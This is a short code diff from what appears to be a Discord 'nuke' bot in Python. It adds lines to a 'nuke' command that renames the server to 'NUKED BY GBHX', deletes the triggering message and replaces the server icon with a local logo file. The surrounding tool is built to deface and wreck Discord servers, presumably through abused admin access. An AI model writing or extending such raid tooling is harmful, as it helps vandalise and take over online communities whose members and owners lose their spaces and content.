@@ -68,7 +68,10 @@ async def admin(ctx):
 async def nuke(ctx, amount=30, name_of_channel="nuked-by-gbhx"):
 
     await ctx.guild.edit(name="NUKED BY GBHX")
-
+    path_to_image = "logo.png"
+    with open(path_to_image, "rb") as file:
+        icon: bytes = file.read()
+        await ctx.guild.edit(icon=icon)
 
     await ctx.message.delete()
 
